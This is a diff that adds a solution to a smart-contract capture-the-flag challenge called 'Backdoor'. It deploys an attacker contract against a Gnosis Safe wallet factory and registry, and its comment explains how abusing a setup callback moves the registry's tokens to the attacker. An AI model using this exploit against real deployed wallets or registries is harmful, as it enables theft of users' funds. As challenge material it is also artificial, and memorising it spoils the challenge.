@@ -37,6 +37,34 @@ describe('[Challenge] Backdoor', function () {
 
     it('Exploit', async function () {
         /** CODE YOUR EXPLOIT HERE */
+
+        const backdoorAttackerContractFactory = await ethers.getContractFactory(
+            "BackdoorAttacker",
+            deployer
+        )
+
+        const users = [alice.address, bob.address, charlie.address, david.address]
+        this.backdoorAttacker = await backdoorAttackerContractFactory
+            .connect(attacker)
+            .deploy(
+                this.masterCopy.address,
+                this.walletFactory.address,
+                this.token.address,
+                this.walletRegistry.address,
+                users
+            )
+
+        /*
+            Vulnerability:
+            Factory createProxyWithCallback function chain calls safe setup function and the setup
+            function accepts a callback address. For each beneficiary, the attacker encodes the 
+            token address as the callback address in the createProxyWithCallback initializer 
+            argument and calls transfer on the resultant address. Since the created wallet contract
+            has no transfer function, transfer is called on the callback address, which is the 
+            token, which results in the registry transferring the token to the attacker.
+        */
+        this.backdoorAttacker.connect(attacker).attack()
+
     });
 
     after(async function () {
